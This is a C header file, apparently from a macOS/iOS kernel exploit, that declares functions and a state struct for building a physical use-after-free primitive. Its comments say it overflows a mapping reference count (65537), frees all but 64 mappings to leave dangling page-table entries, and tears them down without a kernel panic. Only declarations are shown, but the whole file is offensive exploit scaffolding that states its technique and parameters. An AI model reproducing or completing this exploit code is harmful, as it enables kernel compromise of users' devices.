#ifndef PMAP_PUAF_H
#define PMAP_PUAF_H

#include <mach/mach.h>
#include <stdint.h>

#define PMAP_PUAF_OVERFLOW  65537
#define PMAP_PUAF_KEEP      64
#define PMAP_PUAF_PAGE_SZ   16384
#define PMAP_PUAF_SENTINEL  0x41

typedef struct {
    mach_vm_address_t backing;
    mach_port_t entry_port;
    mach_vm_address_t *maps;
    int mappings_created;
    int dangling_ptes;
    int puaf_active;
} pmap_puaf_state_t;

/* Create PUAF: overflow refcount, free all but KEEP mappings. Returns dangling count or -1. */
int pmap_puaf_create(pmap_puaf_state_t *state);

/* Release dangling mappings and backing without triggering panic-oriented teardown. */
void pmap_puaf_destroy(pmap_puaf_state_t *state);

#endif /* PMAP_PUAF_H */
